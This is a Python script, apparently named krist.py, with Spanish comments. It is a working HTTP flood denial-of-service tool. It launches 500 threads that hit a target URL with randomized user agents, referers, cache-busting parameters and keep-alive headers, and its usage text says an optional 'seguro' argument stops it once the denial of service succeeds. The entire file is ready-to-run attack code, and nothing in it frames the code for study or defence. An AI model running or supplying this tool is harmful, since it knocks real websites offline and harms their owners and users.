import urllib.request
import sys
import threading
import random
import re
import logging
import socket
import ipaddress

# Configuración de registro
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Variables globales
target_url = ''
target_host = ''
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/98.0',
    # Agrega más agentes de usuario aquí...
]
referers = [
    'http://www.google.com/?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://engadget.search.aol.com/search?q=',
    # Agrega más referencias aquí...
]
request_counter = 0
flag = 0
safe_mode = False

# Mutex para proteger el contador de solicitudes
counter_lock = threading.Lock()

def increment_request_counter():
    global request_counter
    with counter_lock:
        request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe_mode():
    global safe_mode
    safe_mode = True

def usage():
    print('---------------------------------------------------')
    print('USO: python krist.py <url>')
    print('Puedes agregar "seguro" después de la URL para detener automáticamente después de la denegación de servicio (DoS).')
    print('---------------------------------------------------')

def resolve_host(host):
    try:
        # Intenta resolver el nombre de host a una dirección IP
        ip = socket.gethostbyname(host)
        return ip
    except socket.gaierror:
        return None

# Realiza una llamada HTTP
def http_call(url):
    global flag

    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"

    user_agent = random.choice(user_agents)
    referer = random.choice(referers)

    headers = {
        'User-Agent': user_agent,
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': referer + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5, 10))),
        'Keep-Alive': str(random.randint(110, 120)),
        'Connection': 'keep-alive',
        'Host': target_host,
    }

    try:
        with urllib.request.urlopen(url + param_joiner + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 10))) + '=' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 10))), timeout=5) as response:
            if response.getcode() == 500:
                set_flag(1)
                logger.error('Código de respuesta 500')
    except Exception as e:
        logger.debug(f'Error en solicitud: {e}')
    else:
        increment_request_counter()
        logger.info(f'Solicitud exitosa a {url}')

# Hilo de llamada HTTP
class HTTPThread(threading.Thread):
    def run(self):
        global flag
        try:
            while flag < 2:
                http_call(target_url)
                if flag == 1 and safe_mode:
                    set_flag(2)
        except Exception as e:
            logger.error(f'Error en el hilo HTTP: {e}')

# Monitorea los hilos HTTP y cuenta las solicitudes
class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                logger.info(f"{request_counter} Solicitudes Enviadas")
                previous = request_counter
        if flag == 2:
            logger.info("\n-- krist fin --")

# Ejecución
if len(sys.argv) < 2 or sys.argv[1] == "help":
    usage()
    sys.exit()

target_url = sys.argv[1]

# Modificamos la expresión regular para aceptar HTTP, HTTPS y direcciones IP
match = re.search('https?://([^/]+)|(\d+\.\d+\.\d+\.\d+)', target_url)

if match:
    # La expresión regular puede coincidir con cualquiera de los dos patrones
    host_from_url = match.group(1) or match.group(2)

    # Verificamos si la entrada es una dirección IP válida
    try:
        ipaddress.ip_address(host_from_url)
        target_host = host_from_url
    except ValueError:
        # Si no es una dirección IP válida, asumimos que es un nombre de host en lugar de una IP
        # Realizamos resolución DNS para obtener la dirección IP real
        resolved_ip = resolve_host(host_from_url)
        if resolved_ip:
            target_host = resolved_ip
        else:
            print(f'No se pudo resolver el nombre de host: {host_from_url}')
            sys.exit(1)
else:
    print('La URL o dirección IP no es válida. Asegúrate de que esté en el formato correcto.')
    sys.exit(1)

if target_url.count("/") == 2:
    target_url += "/"

if len(sys.argv) == 3 and sys.argv[2] == "seguro":
    set_safe_mode()

logger.info("-- krist run --")
for _ in range(500):
    thread = HTTPThread()
    thread.start()

monitor_thread = MonitorThread()
monitor_thread.start()
